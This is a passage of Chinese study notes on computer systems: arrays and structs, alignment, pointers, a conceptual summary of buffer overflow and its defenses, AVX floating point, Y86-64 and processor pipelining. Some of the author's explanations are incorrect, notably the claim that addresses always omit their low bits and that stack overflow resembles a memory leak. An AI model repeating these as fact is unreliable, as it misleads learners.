Ri, s）的寻址模式即可访问所有元素；原因：比例因子 s 为 1, 2, 4, 8，刚好足够覆盖所有的基本类型； 指针运算 指针运算会根据数据元素，自动按类型的长度进行等比换算（即按比例自动伸缩），例如对于 int a[10], a[3] 的指针运算表达式为 x + 3*4； 指针类型本身长度为8个字节； 嵌套的数组 整体原则同普通数组，使用行优先的模式；可以通过 A[i][j] 来访问第 i 行第 j 列的元素； 定长数组 对于定长数组，编译器可以实现优化，例如通过变换为指针引用，以及将 for 循环变换为 while 循环，来简化实现过程； 变长数组 C99 引入了对变长数组的支持，例如 int var_ele(long n, int A[n][n], long i, long j) {…} 在这个函数声明中，多了一个参数 n，而且它同时做为数组的长度参数，意味着不同的 n 时数组的长度是跟着变化的； 这也使得在汇编代码中，对于数组地址索引的计算，不再使用定长数组的固定值递增法，而是使用乘法（对于有些处理器，乘法会带来性能的惩罚）； 不过有些编译器，会将步长提高算好存起来，这样就可以递增这个算好的步长，从而实现避免使用乘法； 异质的数据结构 结构 编译器负责维护结构成员的类型信息，指示每个成员的字节偏移量；因此，结构内部成员的访问，可以通过结构指针加上偏移量来实现； 结构各个字段的访问完全是在编译阶段进行处理的，在机器代码中，将只剩下地址，不再包含结构字段的类型和名字等信息； 联合 在一定的条件下，使用联合可以节省空间（不过感觉大部分情况下这种节省没必要，因为多数时候空间不是问题）； 另外联合还可以用来访问不同数据类型的位模式； 通过强制类型转换来实现；同样的位，使用不同的解读方式，得到不同的值； 当使用联合，将不同类型的数据结合到一起时，需要特别注意一下小端机器和大端机器的表现会不同； 注：大小端的差异不是单字节内部，而是多字节的排列； 数据对齐 为了简化处理器与内存之间的接口设计，以处理器访问内存的效率，一般通过将数据对象的内存地址设置为某个长度的倍数； 这些说，貌似只要在栈桢的起始位置，将地址设置为8的倍数，貌似就可以保证对齐的实现？ 即使没有对齐，处理器也能够正常工作，只是内存访问效率可能会降低，原来一次访问成功，变成需要访问两次，才能取到完整的数据； 对齐是由编译器来实现的，处理器本身并没有强制要求（除了某些型号的 SSE 指令外，它要求数据需要是16的倍数）； 原因：处理器对内存的访问，并不是精确到个位的，而是以8为倍数进行访问，因此，需要保证访问的命中率，才能够减少访问的次数；命中以后，处理器会根据情况，对取到的数据进行偏移，以获取最终结果； 原因：处理器指令集的长度，无法全部用来表示地址空间，需要至少保留2位给指令名或者立即数，所以地址空间的可表示位置就少了两位，表示位从倒数第3位开始，倒数2位默认为0，不进行表示；这也决定了处理器给出的地址值总是8的倍数；因此，访问数据时，需要提高这个以8为倍数的地址的命中率，即刚好能覆盖到完整的数据，而不是只覆盖到一半，不然就得取两次进行拼接了； 在机器级程序中将控制与数据结合起来 理解指针 每个指针都有一个类型，它表明指针指向的是哪一类对象；指针并非机器代码的组成，它仅是编程语言本身提供的一种抽象，用来避免寻址错误； 每个指针都有一个值；这个值是一个地址（指定类型的对象存储的地址）（指针自己本身在内存中也有一个地址）； &amp; 运算符用于创建指针；机器代码一般用 leaq 指令来实现； 运算符用来引用指针，其结果获得一个值； 数组与指针联系紧密；二者都可以用来引用； 对指针的强制类型转换，只改变它的类型，不会改变它的值；而类型的改变，会导致在做指针移动的时候，伸缩量的单位不同； 例如假设有 char *p 指针 对于 p + 7，因为 char 只有一个字节，所以伸缩量为 1 字节， 它的伸缩为 p + 7 * 1； 对于 (int *)p + 7，由于 p 被强制转换成 int 类型的指针，因此它的伸缩量变成了4，所以新地址的计算结果变成了 p + 28 字节， p 的值并没有改变； 对于 int *(p + 7)，新地址的计算结果仍为 p + 7 字节 指针也可以指向函数； 函数指针的值，是该函数在机器代码中第一条指令的地址； 使用 GDB 调试器 通过设置断点，我们可以让程序在执行到断点位置的时候停下来，然后把控制权转给我们；接下来我们可以选择用各种命令查看程序的状态信息（如寄存器和内存位置等），也可以单步跟踪运行每一条指令，也可以快进到下一条指令处； GDB 的命令并不好记，不常用的话，经常遗忘；可以考虑它的图形化扩展 DDD，更加方便易用一些； 内存越界引用和缓冲区溢出 原因：C 对于数组的引用不做边界检查，再加上局部变量和状态信息（如寄存器值、返回地址等）都保存在栈中，那么，当出现越界访问和改写时，就会破坏栈桢中的局部变量和状态信息，导致程序出现异常，或者可以让程序运行它原来不可能去运行的程序； 缓冲区溢出：在栈中分配了一个空间，用来保存某个字符串，结果字符的长度超过了空间的大小。因此在保存的时候，会覆盖原来不应该去访问的空间，破坏了里面原本有用的数据； 缓冲区溢出表示程序试图访问比栈中可访问空间更大的空间； 堆栈溢出是程序试图在堆栈中分配过大过多的数据，导致堆栈空间不够用； 感觉堆栈溢出跟内存泄漏差不多一个意思 攻击原理：先输入一串包含运行代码的字符串，骗过检查；然后将某个栈桢的返回地址覆盖成为可运行代码第一指令的地址，然而在返回时，触发代码的调用； 对抗缓冲区溢出攻击 栈随机化 原理：攻击代码存放在某个地方，为了使它能够运行，需要另外有一个指针指向它，以便程序可以跳转到攻击代码的位置；为了得到这个指针，就需要知道攻击代码的栈地址；在早期，程序的栈地址非常容易预测；如果攻击者可以确定一些常见的 Web 服务器所使用的栈空间，就可以实施这类型的攻击； 对抗方法：栈地址随机化 原理：在程序开始前，先分配一个随机大小的栈空间（假设为 n ），这段空间不使用，但它会导致后续的所有程序的栈地址出现变化，使得程序的栈地址空间呈现随机化的状态，使得攻击者不容易猜中； 攻击者会使用空操作雪橇的方式，来暴力枚举地址，所以 n 需要有足够的大小，才能够增加枚举的难度；但这种方法的缺点是会造成内存空间的浪费； 栈破坏检测 原理：在某段程序开始运行前，生成一个随机值，放入栈中；等该段程序运行结束返回时，从栈中取回该值，查询是否跟原值一致；如果不一致，表示栈出现了破坏，马上中止程序运行并进行报错； 限制可执行代码区域 原理：将部分内存区域标记为可读可写，但不可执行，这样可以限制攻击者向系统插入可执行代码的能力，因为即使插入了，也无法被执行； 历史：早期的 x86 体系读和执行两种访问，使用同一个位标示来控制，使得要执行执行控制很麻烦，会有很大的性能损失；现在新的 AMD64 处理器，引入了新的位标志来单独控制执行权限，检查工作可以由硬件完全，性能上不再有损失；（貌似就是虚拟地址的最后3位里面的内容？） 支持变长栈桢 当函数中有局部变量的大小不固定时，例如根据参数会变长的数组，那么编译器就需要使用桢指针（基指针）技术来实现变长栈桢； 原理：使用 %rbp 来保存桢的基指针，接下来的栈空间分配，围绕这个基指针展开，依次分配空间，这样就不需要提前指定栈顶，实现了变长； 那要如何知道当前的栈顶在哪里呢？莫非仍在 %rsp 中？ 这个基指针是给谁用的呢？貌似是给编译器用的；当局部变量的大小固定时，编译生成的指令，可以使用绝对地址，但是如果大小不固定，则编译器不能生成绝对地址的指令，而是要先保存一份基指针，然后根据创建的局部变量大小，加上基指针，得到每次的栈顶指针，然后将它放入 %rsp 中； 浮点代码 背景 SIMD，单指令多数据模式，single instructin multi data；目的：提高操作速度，一条指令，可以实现对多个数据的并行操作；基于 SIMD 模式不断增加出新的扩展(extention)，达到更强大的功能； MMX，多媒体扩展，Multi Media extention；寄存器组叫 MM，64位 SSE，流式 SIMD 扩展，stream SIMD extention；寄存器组叫 XMM，128位 AVX，高级向量扩展，advanced vector extention；寄存器组叫 YMM，256位； 每个 YMM 可以存放 8 个32位值，4个64位值；这些值可以整数，也可以是浮点数 在编译命令中添加选项 -mavx2，可以显式的要求 gcc 编译器生成 AVX2 代码； 浮点传送和转换操作 引用内存的指令（叫标量指令），意味着这些指令只会对单个数据值进行操作，而不是对一组数据值进行操作 引用内存的方式跟整数相同，也是基于偏移量，基址寄存器，变址寄存器，伸缩因子组合的方式； 移动指令：vmovss, vmovsd；vmovaps, vmovapd; 转换指令： 浮点数转整数：vcvttss2si, vcvttsd2si, vcvttss2siq, vcvttsd2siq; 使用截断的方法，向零取整； 整数转浮点数：vcvtsi2ss, vcvtsi2sd, vcvtsi2ssq, vcvtsi2sdq; 使用少见的三操作数指令格式；两个源，一个目的；其中第二个操作数的源可以忽略，它的值一般跟目的操作数是一样的； 单精度转双精度：通常的直觉是使用 vcvttss2sdq 指令，但 GCC 生成的指令却是 vunpcklps + vcvtps2pd 的组合，最终的结果低位与前者相同，区别在于后者还复制了一份低位的值到高位（暂且还不知道 GCC 为什么这么做） 双精度转单精度：GCC 同样有不一样的处理方式；通常的直觉是使用 vcvtsd2ss，但 GCC 却使用了 vmovddup + vcvtpd2psx 的组合，最终结果是高低位各一份副本（让人很奇怪的做法）； 据说 GCC 的这种做法叫做标准的双指令序列，哈哈哈哈，用途暂时不明； 在实际运算过程中，一个函数如果有不同类型的数据，如整数和浮点数，则它可能会同时用到通用寄存器和多媒体寄存器； 过程中的浮点代码 XMM 寄存器使用规则 所有的 XMM 寄存器都是调用者保存的；被调用者可以直接覆盖； 使用 %xmm0 ~ %xmm7 共8个寄存器来传递函数的参数，多出的参数使用栈传递； %xmm0 用来存放函数调用的返回值； 当函数的参数同时包含指针、整数、浮点数等多种类型时，其中指针和整数使用通用寄存器传递，浮点数使用 MMX 寄存器传递； 浮点运算操作 规则：源操作数可以是寄存器，也可以是内存，但目的操作数必须是寄存器； 单精度：vaddss, vsubss, vmulss, vdivss, vmaxss, vminss, sqrtss； 双精度：vaddsd, vsubsd, vmulsd, vdivsd, vmaxsd, vminsd, sqrtsd; 定义和使用浮点常数 对于浮点常数，AVX 不能实现以立即数做为操作数；因此，需要先将浮点常数存储在内存中，然后在使用的时候，再从内存读入； 在汇编中，读取内存中保存的浮点常数很特别，示例如下 .LC2 &#x2F;&#x2F; 首先使用一个标号来定位位置，以下是一个浮点常数 1.8 .long 3435973837 &#x2F;&#x2F; 浮点常数被拆分成低位和高位两段，这段是低位4字节(32位)，此处的十进数对应的二进制数为 0xcccccccd .long 1073532108 &#x2F;&#x2F; 这段是高位4字节(32位)，此处的十进制数对应的二进制数为 0x3ffccccc 对于小端法的机器，高位在左，低位在右 对于双精度浮点数，根据 IEEE 表示法，由1个符号位，11个阶码位，加上52个小数位组成； 高位的 3ff 即为前12位，后面的 ccccc 属于小数位，加上低位4字节的 cccccccd ，共组成 ccccccccccccd 的小数部分 M； 高位 3ff ，即2个0加上10个1，相当于 2的10次方减1，因此对应的十进制为 1023，加上偏移量 1023，刚好得到阶码的值为 0，2的0次方为 1； 最终结果为 M * 1 &#x3D; M； 在浮点代码中使用位级操作 异或操作和与操作 单精度：vxorps, vandps 双精度：vxorpd, vandpd 浮点比较操作 比较两个浮点数，并设置条件码表示比较结果； 单精度：ucomiss s1, s2 双精度：ucomisd s1, s2 涉及三个条件码 零标志位 ZF 进位标志位 CF 奇偶标志位 PF：在整数运算中很少用，有浮点运算中，当两个操作数有一个为 NaN 时，就会设置该标志位； 比较结果 s2 &lt; s1，CF 标志位为 1，其他两个为0 s2 &#x3D; s1，ZF 标志位为 1，其他两个为0 s2 &gt; s1，三个标志位都为 0 无序时，三个标志位都为1（当任意操作数为 NaN 时，即出现无序的状态，表示不可比较） 跳转指令会根据标志位的值组合，进行相应的条件跳转； 对浮点代码的观察结论 浮点运算的机器代码的风格与整数运算大致相同； 对于混合类型的运算，情况会变得复杂一些； AVX2 有能力进行并行操作，因此编译器的开发人员也致力于将标量代码自动转化成并行代码；但目前更可靠的办法，还是使用 C 语言的扩展来实现； 处理器体系结构 Y86-64 指令集体系结构 程序员可见的状态 15个程序寄存器：64位，其中的 %rsp 有固定用途，其他14个没有特定用途和值（事实上在 x86 中是有的） 3个条件码：1位，ZF\\SF\\OF，它们保存着最近的算术指令或逻辑指令所造成的影响的信息； ZERO 零, SYMBOL 符号, OVERFLOW 溢出； FLAG 标志； 1个程序计数器：存放当前正在执行的指令的地址； 内存：此处为虚拟内存，一个巨大的字节数组； 程序状态 stat：表明程序执行的总体状态，正常运行或者出现某种异常； Y86-64 指令 4个传送指令 XXmov，分别为 irmov, rrmov, rmmov, mrmov； 4个整数操作指令 OPq，分别为 addq, subq, andq, xorq； 7个跳转指令 jXX，分别为 jmp, jle, jl, je, jne, jge, jg； 6个条件传送指令 cmovXX，分别为 cmovle, cmovl, cmove, cmovne, cmovge, cmovg；只有条件码满足条件时，才会真正更新； 1个调用指令 call，将返回地址入栈，然后跳转到目的地址； 1个返回指令 ret ，将返回地址出栈，跳转到返回地址； 2个栈操作指令，pushq 入栈，popq 栈； 1个停止指令 halt，暂停整个系统； 指令编码 每条指令的第一个字节表示指令的类型，该字节分成两个部分，高4位表示代码部分（其实是指令大类），低4位是功能部分（其实是指令的小类）； 如果指令需要两个寄存器指示符，由于只有15个寄存器，因此可以只需用高4位表示一个寄存器的代码，低4位表示另外一个寄存器的代码； 如果指令只需要一个寄存器指示符，则其中有一个 4 位用值 0xF 来表示“此处无寄存器”； 偏移量编码使用8字节的常数来表示； 立即数编码使用4字节的常数来表示； 核心目的：确保每条指令的字节数是固定的，这样只要知道字节序列的入口，就可以正确解析出所有的指令； 程序状态 stat AOK 正常操作； HLT 遇到执行 halt 指令； ADR 遇到非法地址； INS 遇到非法指令； Y86-64 程序 整数运算指令不支持立即数，只支持寄存器，因此需要先将立即数存入某个寄存器； andq 和 subq 运算可以用来设置条件码； pushq %rA 指令会将 %rA中的值压入栈中；同时它会改变寄存器 %rsp 中的值，使其指向新的栈顶指针的位置； popq %rA 指令则会将栈中的栈弹出到 %rA；同时它会改变寄存器 %rsp 中的值，使其指向新的栈顶指针的位置； 逻辑设计和硬件控制语言 HCL 大多数数字电路使用信号线上的高电压和低电压来代表不同的位值，高电压代表 1，低电压代表 0； 实现一个数字系统的三个组成部分 实现对位进行操作的函数的组合逻辑； 存储位的存储单元； 控制存储单元更新的时钟信号； 时钟周期的长短是可以自主调节的，调节目标是长度足够让一条指令通过指定的阶段；原因在于电信号通过逻辑门阵列是需要时间的； 硬件控制语言 HCL（Hardware control language），用来描述处理器设计中的控制逻辑； 硬件描述语言 HDL（Hardware Description Language），用来描述硬件结构；目前较常用的是 Verilog； 逻辑合成程序可以将 HDL 语言描述的内容自动转变成有效的电路设计； 目前有开源的工具可以将 HCL 转成 Verilog（HDL），再将它与基本硬件单元的 Verilog 代码结合起来，就能产生完整的 HDL 描述，之后就可以基于它合成实际能够工作的微处理器； 逻辑门：它是数字电路的基本计算单元，它可以根据输入的位值（1个或 n 个），进行布尔运算，然后输出一个运算结果；逻辑门总是处于活动的状态，即当输入产生变化，输出就会很快发生变化； 将很多个逻辑门组成一个网，就能构造出计算块（computional block），称为组合电路；它必须遵守如下规则 每个逻辑门的输入必须连接到以下三种之一 一个系统输入（即主输入） 某个存储器单元的输出； 某个逻辑门的输出； 两个或多个逻辑门的输出不能连接在一起； 网必须是无环的； 组合电路 bool eq &#x3D; (a &amp;&amp; b) || (!a &amp;&amp; !b); bool xor &#x3D; (!a &amp;&amp; b) || (a &amp;&amp; !b); 多路复用器 MUX（multiplexor），它会根据输入 s 的不同值得到 a 或 b； bool out &#x3D; (s &amp;&amp; a) || (!s &amp;&amp; b) 由逻辑门组合而成的组合逻辑电路，与 C 语言中的逻辑表达式很像，都是用布尔操作对输入进行计算的函数； 不过逻辑电路的输入只有 0 和 1 两种，不像 C 语言中可以是任意整数； 字级运算的组合电路：对输入的字的每个位进行计算，得到输出的字的每个位； 多路复用函数可以用情况表达式（case expression）来描述 [ select1: expr1; select2: expr2; ….. select3: expr3; ] 算术逻辑单元的组合电路可以通过 2 个数据输入 + 1个控制输入来完成，控制输入用来设置运算的类型； 集合关系：判断某个信号是否属于某个信号集合；iexpr in {iexpr1, iexpr2, …, iexpr3}； Y86-64 的顺序实现 SEQ 将处理组织成段 按流水线分段，目的：充分利用硬件的性能，实现更高的处理效率 阶段组成 取指 根据 PC 程序计数器中存储的地址，从内存中读取指令字节； 根据当前取出的指令字节的长度，计算出下一条指令的地址 valP， 从指令中抽取内容，包括：指令代码 icode、指令功能 ifun、寄存器指示符 rA 或 rB、常数 valC 等； 译码 从寄存器中读入操作数；得到 valA 或&#x2F;和 valB；要么从 rA 或 rB 中读，要么从 %rsp 中读； 执行 算术逻辑单元 ALU 执行指令指明的操作 执行动作可能有： 计算内存引用的地址，得到值 valE； 增加或减少栈指针，得到值 valE； 设置条件码，得到信号 Cnd； 访存 将数据写入内存，或者从内存中读取数据；读出的值记为 valM； 写回 将结果写入寄存器文件，最多可以写两个； 更新 PC 将 PC 设置为下一条指令的地址 valP； SEQ 硬件结构 组成：数据线、时钟寄存器、硬件单元（当作黑盒子处理）、控制逻辑块（实现控制逻辑，在不同硬件单元之间传递数据，并操作这些单元，使得对每个不同的指令执行指定的运算） SEQ 的时序 原则：从不回读；即一条指令的成功执行，不需要依赖当前指令执行后的结果；如果需要自我依赖的话，就麻烦了，无法实现时序控制； 组成： 组合逻辑：不需要任何时序或控制，只要输入发生变化，值就通过逻辑门网络传播； 随机访问存储器：包括寄存器文件、指令内存、数据内存；同上，根据地址进行输入得到输出（对于大电路，需要使用特殊的时钟电路来模拟这个效果）； 时钟寄存器：程序计数器和条件码寄存器； 需要明确时序控制的四个硬件单元：程序计数器、条件码寄存器、数据内存、寄存器文件； 每个时钟周期分为上沿和下沿，处于上沿时，会更新硬件单元；进入下沿时，会更新组合逻辑；再进入下一个上沿时，更新硬件单元，以此类推，不断反复； SEQ 阶段的实现 取指阶段 从内存一次性读入10个字节（为什么是10个字节整？因为 Y86 指令集设计的最大指令长度为10字节）； 第一个字节解释为指令字节，并分成两个4位的数，对应 icode 和 ifun 根据 icode 得到三个信号 instr_valid：指令是否合法 need_regids：是否有操作数 need_valC：是否有常数 根据 need_regids 和 need_valC 计算下一条指令的地址，供下一个周期读入指令使用； 根据 need_regids 从余下的9个字节中，提取 rA、rB 和 valC； 译码和写回阶段 寄存器文件有4个端口，两个读（A 和 B），两个写（E 和 M）； 每个端口由两个连接组成，一个是地址连接，一个是数据连接； 地址连接是一个寄存器 ID； 数据连接是一组64位的线路；即可用于输入（写端口），也可用于输出（读端口）； 如果某个地址端口标记为 0xF，则表示不需要访问寄存器文件； srcA 的硬件描述示例 word srcA &#x3D; [ icode in { IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ } : rA; icode in { IPOPQ, IRET } : RRSP; 1 : RNONE; &#x2F;&#x2F; 表示不需要访问寄存器 ] 执行阶段 算术逻辑单元，根据 alufun 信号的设置，对输入进行加、减、和、异或的运算，得到输出 valE； 每次运行时，还会产生三个与条件码相关的信号，根据 icode 判断是否需要更新条件码寄存器； 访存阶段 根据 icode 判断执行读还是写操作 若为读，则数据内存单元将存储从内存中读取的值，得到 valM; 访存的最后阶段还会更新状态码 stat，它的依据来源于 icode、imem_error、instr_valid、dmem_error 的信号； 如果在此里更新了状态码，那么要让它发挥用途的话，理论上应该在某个地方对它进行检查；直觉上应该是在下一条指令开始之前做检查工作？ 更新 PC 阶段 新的 PC 可能是 valC、valM 或者 valP，需要依据指令类型和条件码进行判断； SEQ 顺序设计的小结 优点：可以用很少量的硬件单元和一个时钟来控制计算的顺序； 缺点：性能太差，时钟必须设置得很慢，这样才能够让信号在一个时钟周期内传播到所有的阶段；吞吐量太小； 流水线的通用原理 流水线设计的优点：可以大大的提高吞吐量； 流水线设计的挑战在于，系统的吞吐量会受到最慢阶段的速度的限制；而有些硬件单元，例如 ALU 和内存，很难被划分成多个延迟较小的单元； 流水线过深虽然可以进一步提高吞吐量，但由于引入过多的中间寄存器，而这些寄存器是会增加延迟成本的，所以最后汇总下来并不一定更划算； Y86-64 的流水线实现 重新安排计算阶段 将 PC 的计算移动到一个周期的开始，即时钟上沿；并增加状态寄存器，用来保存上一条的计算结果，然后依据该结果计算新的 PC； 在新的设计中，PC 不再是一个实体的硬件单元，而是根据状态码寄存器的内容，动态计算的结果；这里面隐含着一个概念，在逻辑上存在的事物，在设计中并不一定需要真实的映射硬件，它也可以是一种动态生成的方式；只要确保它能够得到正确的结果即可；同一种逻辑行为，可以有很多种物理实现方式； 状态单元的引入，称为电路重定时技术，它可以同步不同硬件单元间的延迟； 增加流水线寄存器 由于现在每个阶段单独执行在一个时钟周期中，因此需要在每个阶段之间增加流水线寄存器，以便保存每个周期的处理结果； 由于有5个阶段，因此也刚好对应需要5个流水线寄存器，分别为 F, D, E, M, W； 对信号进行重新排列和标号 不同阶段的流水线寄存器，会加上该阶段的大写字母前缀，以方便唯一识别；例如：F_stat 对于各个阶段刚刚计算出来的结果（尚未存入流水线计算器），则加上小写的字母以唯一识别，例如 f_stat； 在 PIPE- 的设计中，将 SEQ 设计中的 Data 模块移除，改成并入 valA 模块；原因：如果某个阶段的处理结果，有可能在后续阶段使用，流水线寄存器就需要确保携带它们穿入余下的阶段；但如果有某些信号是互斥的，则可以将它们合并成一个信号，这样一来可以减少流水器寄存器的数理，更加高效的利用有限的硬件单元； 预测下一个 PC 困境：虽然将指令分阶段处理提高了处理吞吐量，但是有些指令是依赖于前一条指令的处理结果的，例如条件跳转和 ret；当它们进入流水线时，前面的指令可能还没有处理好，这个时候导致它们需要处于等待状态，从而破坏了流水线的节奏； 应对办法：直接根据某个设定的策略，预测下一个分支，进行流水线处理；大多数情况下，例如 call 和 jmp 无条件跳转，这种预测绝对是正确 ；但对于条件跳转和 ret，有可能存在预测错误的情况，因此，还需要再补充一个错误处理机制进行完善； 预测策略 always taken：永远选择；命中率约50%； backwad taken：反向选择，当分支地址比下一条地址低时，就选择分支；反之不选择分支，命中率约65%；原理：循环的结束判断后置； forward not-taken：正向不选择，同上； 对于 ret 是没有办法使用预测的，因为无法预测，它总是会返回栈顶的字，但里面存着什么是不确定的，有无限种可能； 对于 Y86 处理器，此时唯一的处理办法只能是暂停流水线处理新的指令，一直等到 ret 指令通过写回阶段； 但是对于 x86 处理器，它通过在处理器增加一个硬件栈，每次有 call 调用指令进来的时候，就把它计算出来的返回地址压入这个硬件栈中，然后在 ret 指令进来的时候，就从硬件栈中弹出栈底的值，做为预测值；这种策略的准确性很高，但偶尔也会出现不命中的情况，所以提供恢复机制是不可少的；这个硬件栈对程序员不可见； 流水线冒险 当相邻的指令之间存在数据依赖或者控制依赖时，按时之前的设计，将会出现错误。因为新的指令还不能等到前一条指令的处理结果；因此，将出现两种冒险，即 data hazard 和 control hazard； 用暂停来避免数据冒险 原理：在对新一条指令取指和译码后，通过检查，发现它存在数据冒险，此时通过插入一个气泡，或者插入一个 nop 指令，迫使当前指令不会进入下一个周期，而是在当前周期再重复执行一次；待下次执行的时候，再次检查是否存在冒险，以此类推，甚至冒险消失； 优点：设计和实现起来非常简单 缺点：性能下降很多； 用转发来避免数据冒险 原理：由于数据冒险都发生在执行阶段，所以将执行阶段的结果、M 和 W 流水线寄存器的结果转发到执行阶段之前，并通过判断操作的源寄存器 ID 和转发的寄存器 ID 值是否一致，判断是否需要使用转发值，从而实现提前获取上一条指令的计算结果，而无须暂停进行等待； 加载&#x2F;使用数据冒险 缘起：对内存的读写发生在 M 阶段，而 M 阶段发生在 E 阶段之后，如果紧跟其后的下一条指令，需要使用当前指令从内存中读取的值，此时就会出现加载数据冒险，因为在 M 读到值后再转发已经来不及了，下一条指令已经通过了 E 阶段； 解决办法：使用暂停+转发结合的技术；当发现有加载数据冒险时，就插入一个气泡，推迟下一条指令一个时钟周期；这个技术称为加载互锁 load interlock； 避免控制冒险 控制冒险：即无法根据取值阶段的结果，计算得到下一条指令的地址，这种情形只发生在两种指令身上：ret 返回指令和 jmpXX 条件跳转指令； 对于 ret 指令，没有什么好的办法，只能通过让流水线暂停三个时钟周期，等待 ret 的返回结果，之后才能获得下一条指令的正确地址，并继续流水线处理； 对于 jmpXX 条件跳转，一开始先做预测，待条件判断的指令到达 E 阶段后，即可得到判断结果，此时可以知道之前的预测是否正确；如果预测错误，则提前处理的两个时钟周期的指令只能废弃，并从另外一条分支的指令继续流水线；虽然会浪费两个时钟周期的处理结果，但是由于预处理的两条指令都还未到达 E 阶段，所以对它们的预处理并不会给后续的指令带来影响，可以直接丢弃，而无须做其他工作； 异常处理 在完整的处理器设计中，当出现异常时，处理器会继续调用异常处理程序（exception handler），这个程序属于操作系统的一部分； 细节问题 由于流水线的设计，导致可能存在多条指令同时触发异常；此时的原则是最深的那条指令触发的异常优先级最高，选择它汇报给操作系统； 由于提前做出分支预测，读取了一条跳转后的位置的指令，并触发了异常，但随后发现预测错误，原本就不应该去取那条指令； 一条指令触发了一个异常，此时开始调用异常处理指令，但后续的指令在异常指令完成之前，改变了系统的部分状态； 解决方案：当处于访存或者写回阶段的指令触发异常时，应限制后续的指令更新条件码寄存器和数据内存； 当一条指令触发了异常，此时会更新流水线寄存器中的状态码，但不中断流水线，只是限制不得更新条件码寄存器和数据内存；直到该条指令携带的异常状态码到达最后的写回阶段时，由于它是第一个到达的异常指令，此时停止程序执行，控制转移给异常处理程序； 对于该条指令之后的指令，虽然它们进入了流水线，但随后都会将它们的状态信息取消；（后续有两种可能性，从中断处再次执行触发异常的指令，或者直接执行下一条指令，取决于异常的种类） PIPE 各阶段的实现 PC 选择和取指阶段，现在有了三个选择源 当分支预测错误时：取值 M_valA； 当ret 指令进入写回时：取值 W_valM 当其他情况：取值 F_predPC 译码和写回阶段 此阶段需要接收很多后续阶段流水线寄存器转发过来的值，并进行判断决定是否采用； 判断依据：转发值所处的流水线阶段越早，则采用的优先级越高；因为越靠近当前指令的指令的状态越新； 在写回阶段，需要判断当有气泡的时候，仍然保持 stat 状态值为正常； 执行阶段 当前面的指令出现异常时，执行阶段的指令不得更新条件码寄存器，因此在更新前，需要判断一下前面的指令是否已经出现异常； 访存阶段 流水线控制逻辑 特殊控制情况所期望的处理，包括：加载&#x2F;使用数据冒险的处理、ret 的处理、预测错误分支的处理、异常处理； 发现特殊控制条件：将四种特殊情况的触发条件用 HCL 代码来表示； 流水线控制机制：给每个流水线寄存器增加两个信号输入，分别为暂停信号和气泡信号；正常状态下，两个信号都为0；当暂停信号为1时，寄存器禁止更新，并保存当前值，以形成阻塞的效果；当气泡信号为1时，触发寄存器的复位，值更新为硬件设计师预测配置好的复位值，这个值对于不同阶段的寄存器有所不同，相同的是能得到气泡空指令穿过流水线的效果； 控制条件组合 多数冒险是互斥的，只有两种情况可能同时出现，即 组合A：跳转冒险 + ret 冒险； 组合B：加载冒险 + ret 冒险； 对于组合A，由于我们总是选择跳转，所以不会马上遇到 ret 冒险，所以它跟普通的跳转预测错误的处理没有区别； 组合 B 需要进行特殊处理，因为按原来的处理机器，此时处理器会对两种冒险都给出处理方案，即暂停 ret 同时添加气泡，但实际上只需要采取一种处理方案即可； 控制逻辑实现 前面涉及的各种情况的处理方案，最终需要落地为一个新的逻辑单元（即流水线控制逻辑），它接收各个流水线寄存器发送过来的信号，并进行判断和给出新的反馈信号； 在完成了Y86的逻辑设计后，进行形式化的测试是必不可少的，它有助于发现设计中隐藏的问题；同时利用逻辑合成工具，可以将设计翻译成实际的逻辑电路；之后，利用可编程的门阵列硬件（FPGA），就可以试运行 Y86 的程序了； Y86-64 模拟器原理：将逻辑块的 HCL 描述翻译成 C 代码，编译这些代码，并与模拟代码的其他部分进行链接，这样就可以模拟出实际的处理器工作过程； 性能分析 一般使用 CPI（cycles per instructin）每指令周期数来衡量整体性能；这个值是流水线平均吞吐量的倒数，时间单位是处理器的时钟周期； 添加特殊情况处理机制，不可避免会带来惩罚导致性能下降；不同异常的发生概率是不同的，因此对于更准确 CPI 的计算应纳入三种异常的发生概率 CPI &#x3D; 1.0 + lp + mp + rp lp: load penalty mp: mispredicted branch penalty rp: return penalty; 此处 CPI 不小于 1，但如果引入乱序设计， CPI 有可能会小于 1，届时一般使用它的倒数即 IPC（每时钟周期的指令数） 来衡量性能 未完成的工作 多周期的指令：部分复杂的指令需要多周期才能完成，例如乘法、除法、浮点运算；为了避免处理这些复杂指令时造成等待，一般使用额外的整数和浮点运算单元来处理这些指令，这些可以当随后的指令得以并发执行；但需要增加相应的同步机制，以避免出现冒险； 与存储系统的接口 从物理磁盘读取数据无法在一个时钟周期内完成，而是需要上百万个时钟周期；通过引入多级高速缓存机制和虚拟地址翻译的TLB缓存机制，利用时间和空间局部性，大部分时候可以在一个时钟周期内读取写数据；但偶尔的缓存不命中，就不可避免的需要让流水线进入暂停的状态； 当被引用的存储位置是在磁盘而不是在内存中的时候，会触发缺页异常，之后会调用操作系统的异常处理程序（需要几百个时钟周期），将数据从磁盘加载到内存中（需要几百万个时钟周期），然后再从原来中断的指令处重新开始执行； 当前的微处理器设计：PIPE 是一个单周期单指令的流水线化设计，目前最新的设计方式引入了单周期多指令的乱序执行技术，它可以实现超标量操作，并行的取指、译码和执行多条指令（即指令级并行）；但在很多使用嵌入式系统的设备中，PIPE 这类设计仍有广泛用途，因为它更简单，从而控制了低成本和低功耗； 小结 在设计更深和更多并行性的系统中，如何正确处理异常将会是一个有非常大挑战的问题； 指令集体系架构（ISA）在处理器功能以及如何实现这些功能之间提供了一层抽象；对于处理器外部的软件，它们只需要关心处理器提供的功能接口，而无须关心它的底层是如何实现的； 设计处理器必须非常谨慎小心，并使用系统化的测试，因为在硬件生产出来后，如果发现细微的错误，是无法进行更正的，代价非常惨重； 优化程序性能 优化编译器的能力和局限性 编写高效程序的方法 选择合适的算法和数据结构； 编写能够让编译器翻译成高效目标代码的源代码； 将一个大的计算任务拆分多个小任务并行计算； 当函数存在副作用会修改全局变量时，对函数的调用将会很难被编译器优化； 用内联函数替换函数调用也是一种优化方法，但是它的局限性是会导致 GDB 调试器进行追踪或设置断点失效，同时代码剖析工具也很可能会失效； 表示程序性能：通过每元素的周期数 CPE （cycles per element）来表示程序性能；它特别适用于循环类的计算，即一组元素中平均需要的周期数； 程序示例：确定哪些代码变换会显著提高性能的最好方法是实验加上分析：反复的尝试不同的方法，并进行测量，并检查底层的汇编代码以确定性能瓶颈； 消除循环的低效率：如果有某个值的计算在循环过程中是不同变的，则应该将该计算放到循环开始前进行，而是每次循环的时候都重复计算一次，没有意义还降低了性能； 